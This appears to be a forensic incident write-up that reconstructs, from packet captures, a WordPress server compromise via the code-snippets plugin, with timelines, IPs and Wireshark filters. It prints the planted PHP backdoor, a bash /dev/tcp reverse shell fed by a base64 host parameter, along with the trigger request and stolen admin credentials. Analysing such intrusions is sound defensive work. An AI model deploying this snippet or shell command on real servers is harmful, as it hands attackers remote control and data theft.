# CVE-2024-7420 (58.16.78.90 -> 192.168.100.101)

TCP flows confirm a potentially malicious action by an actor with admin privileges who installed the **code-snippets** plugin. Further analysis was conducted to verify exploitation of known vulnerabilities.

## When

| **Event**                     | **Timestamp** | **TCP Stream** | **Details**                                   |
|--------------------------------|---------------|----------------|-----------------------------------------------|
| Admin login                   | 22:45:15.45   | 458            | POST to /wp-login.php with admin:byebye       |
| Plugin installation           | 22:45:15.80   | 461            | Navigation and installation of code-snippets  |
| Malicious snippet upload      | 22:46:21.03   | 621            | POST with file fancy_rnd.json                 |
| Remote shell activation       | 22:47:09.60   | 730            | GET with rand=NTguMTYuNzguOTAvNDQz            |

## Who/Where

| **Role**         | **IP Address**         | **Port**        |
|-------------------|------------------------|-----------------|
| Attacker          | 58.16.78.90           | 51144, 51176, 54012, 44250 |
| Compromised server| 192.168.100.101       | 80 (srv-www)    |
| Reverse shell destination | 58.16.78.90    | 443             |

## What

1. The attacker logged in using the same credentials (admin:byebye) stolen in the previous db attack.

```sh
    POST /wp-login.php
    ...
    log=admin&pwd=byebye
```

2. Access and installation of the plugin through the WordPress dashboard.

```sh
    GET /wp-admin/plugins.php
    GET /wp-admin/plugin-install.php
    POST /wp-admin/admin-ajax.php HTTP/1.1
    slug=code-snippets&action=install-plugin&_ajax_nonce=aad5c50a4b&_fs_nonce=&username=&password=
    &connection_type=&public_key=&private_key=
```

3. Upload of the malicious PHP snippet.

    - The snippet contains code to invoke a reverse shell using a base64-decoded IP/port.

    ```php
    add_action('init', function() {
        if ( isset($_GET['rand']) ) {
            exec('/bin/bash -c "bash -i >& /dev/tcp/' . base64_decode($_GET['rand']) . ' 0>&1"');
        }
    });
    ```

4. Shell activation.

```sh
    GET /?rand=NTguMTYuNzguOTAvNDQz
```

 - echo "NTguMTYuNzguOTAvNDQz" | base64 -d 
 - 58.16.78.90/443
 - The WordPress server initiates an outbound connection to 58.16.78.90:443, establishing an interactive Bash shell.

## How

- The attacker exploited the admin credentials modified in the previous attack.
- The vulnerability [CVE-2024-7420](https://nvd.nist.gov/vuln/detail/CVE-2024-7420) was used.

## Why

- Gain full control over the web server.
- Exfiltrate sensitive corporate data.
- Potential installation of persistent backdoors.

**Wireshark filters used**

```sh
http.request.method == "POST" && http contains "login"
http.request.method == "POST" && http.request.uri contains "code-snippets"
http.request.uri contains "rand="
```